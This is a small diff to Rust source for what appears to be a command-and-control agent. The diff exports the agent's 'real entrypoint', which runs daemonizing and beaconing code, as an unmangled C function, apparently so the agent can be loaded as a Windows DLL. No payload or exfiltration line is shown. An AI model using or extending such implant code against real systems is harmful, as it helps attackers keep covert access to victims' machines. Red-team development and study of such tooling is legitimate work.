@@ -6,6 +6,7 @@ use winapi::shared::minwindef;
 use winapi::shared::minwindef::{BOOL, DWORD, HINSTANCE, LPVOID};
 use crate::agent::calculate_sleep_time;
 use crate::agent::Agent;
+pub use crate::real_main;
 
 mod agent;
 mod cat;
@@ -38,7 +39,8 @@ mod workinghours;
 
 /// Real entrypoint of the program.
 /// Checks to see if the agent should daemonize and then runs the main beaconing code.
-pub fn real_main() -> Result<(), Box<dyn Error>> {
+#[no_mangle]
+pub extern "C" fn real_main() -> Result<(), Box<dyn Error>> {
     if let Some(daemonize) = option_env!("daemonize") {
         if daemonize.eq_ignore_ascii_case("true") {
             // Fork the process if daemonize is set to "true"
